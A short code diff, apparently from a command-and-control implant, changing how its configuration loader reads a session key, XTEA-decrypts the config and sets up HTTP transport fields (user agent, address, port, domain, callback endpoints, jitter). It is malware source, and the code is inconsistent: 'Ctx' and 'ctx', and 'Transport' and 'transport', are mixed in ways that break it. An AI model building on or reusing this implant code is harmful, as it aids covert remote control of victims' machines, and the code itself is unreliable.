@@ -290,13 +290,13 @@ defer:
         CreateParser(&parser, Config, sizeof(Config));
         MemSet(Config, 0, sizeof(Config));
 
-        Ctx->Transport.PacketCache  = nullptr;
-        ctx->session.NodeId			= UnpackUint32(&parser);
+        Ctx->PacketCache  	= nullptr;
+        ctx->session.NodeId	= UnpackUint32(&parser);
 
         ParserMemcpy(&parser, &Ctx->Config.SessionKey, nullptr);
 
         if (ENCRYPTED) {
-            XteaCrypt(B_PTR(parser.buffer), parser.length, Ctx->Config.SessionKey, false);
+            XteaCrypt(B_PTR(parser.buffer), parser.Length, Ctx->Config.SessionKey, false);
         }
 
         ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr);
@@ -308,19 +308,20 @@ defer:
         Ctx->Config.Jitter          = UnpackUint32(&parser);
 
 #ifdef TRANSPORT_HTTP
-        Ctx->Transport.Http = (_http_context*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP));
+        Ctx->Transport.Http = (PHTTP) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP));
 
-        Ctx->Transport.Http->hInternet     = nullptr;
+        Ctx->Transport.Http->hInternet  = nullptr;
         Ctx->Transport.Http->Endpoints  = nullptr;
         Ctx->Transport.Http->Headers    = nullptr;
 
         ParserWcscpy(&parser, &Ctx->Transport.Http->Useragent, nullptr);
         ParserWcscpy(&parser, &Ctx->Transport.Http->Address, nullptr  );
+
         Ctx->Transport.Http->Port = (INT) UnpackUint32(&parser);
         ParserStrcpy(&parser, &Ctx->Transport.Domain, nullptr);
 
         ctx->transport.http->nEndpoints = UnpackUint32(&parser);
-        ctx->transport.http->endpoints  = (WCHAR**) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(WCHAR*) * ((ctx->transport.http->nEndpoints + 1)));
+        ctx->transport.http->endpoints  = (WCHAR**) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(WCHAR*) * ((Ctx->Transport.Http->nEndpoints + 1)));
 
         for (auto i = 0; i < Ctx->Transport.Http->nEndpoints; i++) {
             ParserWcscpy(&parser, &Ctx->Transport.Http->Endpoints[i], nullptr);
